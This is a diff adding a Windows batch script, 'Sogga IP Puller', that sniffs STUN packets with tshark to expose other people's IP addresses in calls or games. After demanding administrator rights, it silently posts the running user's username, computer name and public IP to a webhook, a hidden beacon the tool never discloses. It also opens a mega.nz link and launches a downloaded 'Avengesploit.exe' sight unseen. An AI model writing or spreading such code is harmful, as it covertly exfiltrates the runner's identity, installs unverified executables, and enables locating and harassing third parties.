@@ -1,0 +1,78 @@
+ÿþ&cls
+@echo off
+color 0a
+title Sogga IP Puller
+setlocal enabledelayedexpansion
+
+net session >nul 2>&1
+if %errorlevel% neq 0 (
+    echo [-] Please run this script as administrator
+    pause
+    exit /b
+)
+
+for /f "usebackq delims=" %%i in (`powershell -NoProfile -Command "(Invoke-RestMethod -Uri 'https://api.ipify.org')"`) do set "public_ip=%%i"
+
+if not defined public_ip (
+    echo [!] Failed to retrieve public IP.
+    pause
+    exit /b
+)
+
+set "webhook_url=YOUR_WEBHOOK_HERE"
+powershell -NoProfile -Command "Invoke-RestMethod -Uri '!webhook_url!' -Method Post -ContentType 'application/json' -Body (@{content='[!] User Executed Script`n**User:** %username%`n**PC:** %computername%`n**IP:** %public_ip%'} | ConvertTo-Json)" >nul 2>&1
+
+set "avengersploit="
+if exist "%userprofile%\downloads\Avengesploit.exe" set "avengersploit=%userprofile%\downloads\Avengesploit.exe"
+
+set "tshark_path="
+if exist "C:\Program Files\Wireshark\tshark.exe" set "tshark_path=C:\Program Files\Wireshark\tshark.exe"
+if exist "C:\Program Files (x86)\Wireshark\tshark.exe" set "tshark_path=C:\Program Files (x86)\Wireshark\tshark.exe"
+
+if not defined tshark_path (
+    echo [!] T-Shark was not found.
+    start https://www.wireshark.org/download.html
+    pause
+    exit /b
+)
+
+if not defined avengersploit (
+    echo [-] Avenger sploit not found
+    set /p ask="Do you want avengersploit? Y/N: "
+    if /i "!ask!"=="Y" (
+        goto sploit
+    ) else (
+        pause
+        cls
+    )
+)
+
+if defined avengersploit (
+    echo [+] Thank you for your contribution, Enjoy!
+    start "" "%userprofile%\Downloads\Avengesploit.exe"
+    pause
+    goto continue
+)
+
+echo.
+:continue
+"%tshark_path%" -D
+echo.
+set /p interface="Select your interface number (e.g., 5 or 6 for Wi-Fi): "
+
+cls
+echo ===================================================
+echo   Grabbing STUN Ips (Filtering: %public_ip%)
+echo ===================================================
+echo.
+
+"%tshark_path%" -i %interface% -p -f "udp" -Y "stun.type == 0x0101 && stun.att.type == 0x0020 && !(stun.att.ipv4 == %public_ip%)" -T fields -e stun.att.ipv4
+
+pause
+
+:sploit
+start https://mega.nz/file/fl53mDyb#75hZzWfp-8gyT2mg-omwI0zLE9JxthnX4wsPUbhoxzQ
+start "" "%userprofile%\Downloads\Avengesploit.exe"
+echo.
+cls
+goto continue
